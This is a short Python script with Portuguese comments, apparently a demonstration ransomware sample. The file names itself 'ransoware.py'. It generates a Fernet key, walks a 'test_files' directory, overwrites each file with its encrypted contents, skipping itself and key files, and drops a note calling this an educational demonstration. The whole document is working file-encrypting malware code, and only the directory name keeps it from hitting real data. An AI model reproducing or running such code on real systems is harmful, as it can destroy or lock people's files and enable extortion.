from cryptography.fernet import Fernet
import os

# Gerar chave de criptografia e salvar

def generate_key():
    key = Fernet.generate_key() 
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# Carregar chave de criptografia
def load_key():
    return open("secret.key", "rb").read()

# Criptografar arquivo
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

# Encontrar arquivos para criptografar
def find_files_to_encrypt(directory):
    files_to_encrypt = []
    for root, _, files in os.walk(directory):
        for file in files:
            path = os.path.join(root, file)
            if file != "ransoware.py" and not file.endswith(".key"):
                files_to_encrypt.append(path)
    return files_to_encrypt

# Mensagem informativa
def display_info_message():
    with open("INFO_NOTE.txt", "w") as note:
        note.write("Files have been processed for educational purposes.")
        note.write("\nThis is a demonstration of encryption techniques.")
        note.write("\nUse the decryption script to restore files.")

# Execução principal
def main():
    generate_key()
    key = load_key()
    files = find_files_to_encrypt("test_files")
    for file_path in files:
        encrypt_file(file_path, key)
    display_info_message()
    print("Files have been processed for educational demonstration!")

if __name__ == "__main__":
    main()